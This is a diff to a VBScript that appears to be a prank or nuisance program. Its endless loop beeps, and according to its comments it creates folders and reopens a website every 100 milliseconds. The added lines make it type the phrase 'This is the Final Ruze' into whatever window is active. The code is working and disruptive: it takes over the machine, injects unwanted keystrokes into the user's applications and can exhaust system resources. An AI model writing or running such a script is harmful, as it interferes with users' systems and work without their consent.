@@ -14,6 +14,12 @@ Do While True
     ' Play the system beep sound
     objShell.Run "PowerShell -Command ""[System.Media.SystemSounds]::Beep.Play()""", 0, True
     
+    ' Wait for 1 second before typing the search term
+    WScript.Sleep 1000
+    
+    ' Type the search term in any active search bar
+    objShell.SendKeys "This is the Final Ruze"
+    
     ' Wait for 100 milliseconds before creating the next folder and opening the website again
     WScript.Sleep 100
 Loop
